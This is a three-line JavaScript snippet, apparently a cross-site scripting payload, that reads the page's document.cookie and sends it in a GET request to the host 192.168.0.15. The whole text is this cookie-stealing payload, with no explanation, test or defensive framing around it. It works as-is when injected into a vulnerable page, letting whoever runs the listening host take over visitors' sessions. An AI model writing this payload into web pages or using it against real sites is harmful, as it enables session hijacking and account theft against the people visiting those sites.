var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.0.15/?cookies=' + document.cookie);
request.send();
